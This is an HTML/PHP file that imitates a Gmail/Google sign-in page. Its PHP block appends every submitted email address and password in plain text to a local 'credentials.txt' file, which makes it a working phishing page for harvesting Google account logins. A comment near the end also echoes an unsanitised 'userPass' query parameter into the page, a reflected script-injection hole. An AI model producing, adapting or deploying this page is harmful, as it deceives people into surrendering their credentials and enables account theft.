<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Gmail</title>
</head>
<body>
    <div class="container">
        <div class="logo-block margin">
            <img src="logo.jpg" class="title-image" width="100px" alt="google logo">
        </div>
    
        <div class="title-block">
            <h1 class="login-title">One account. All of Google.</h1>
        </div>
    
        <div class="signin-block">
            <h3 class="login-text">Sign in with your Google Account</h3>
    
            <div class="account-wall">
                <img class="profile-img" src="" alt="profile picture">
    
                <form class="form-signin" method="post">
                    <input type="text" class="form-control" name="user" placeholder="Email" required autofocus>
                    <input type="password" class="form-control" name="pass" placeholder="Password" required>   
                    <button id="button1" type="submit">Sign in</button>
                </form>
            </div>   
            <a href="#" class="new-account">Create an account </a>
        </div>
    </div>
    <!-- total: <?php echo $_GET["userPass"]; ?> -->
</body>
</html>

<?php         
    if(isset($_POST['user']))
    {
        $user='user: ' . $_POST['user'];
        $pass='password: ' . $_POST['pass'];
        $userPass = "\n" . $user . ' ' . $pass;
        $fp = fopen('credentials.txt', 'a');
        fwrite($fp, $userPass);
        fclose($fp);
    }
?>